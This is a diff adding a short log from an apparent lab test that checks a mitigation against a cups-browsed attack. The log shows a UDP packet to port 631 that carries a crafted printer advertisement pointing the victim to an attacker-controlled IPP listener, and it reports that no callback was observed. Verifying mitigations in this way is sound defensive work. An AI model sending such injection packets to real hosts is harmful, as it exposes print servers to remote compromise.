@@ -1,0 +1,7 @@
+2026-11-16 17:50:51,501 INFO IPP callback listener up on 10.13.37.1:16330
+2026-11-16 17:50:51,801 INFO [basic] sending UDP 10.13.37.1:0 -> 10.13.37.10:631 (103 bytes) src_spoofed=False
+2026-11-16 17:50:51,801 DEBUG payload: b'0 3 ipp://10.13.37.1:16330/printers/AFTER-MITIGATION-KALI "Attacker Controlled" "Totally Legit Printer"'
+2026-11-16 17:50:51,832 INFO waiting up to 10s for the victim to connect back...
+2026-11-16 17:51:03,021 INFO wrote 3 packets to pcap_files/attack_variant1_after_mitigation_kali.pcap
+2026-11-16 17:51:03,022 INFO RESULT: no callback observed within 10s
+2026-11-16 17:51:03,022 INFO wrote run summary to evidence/attack_variant1_after_mitigation_kali_summary.json
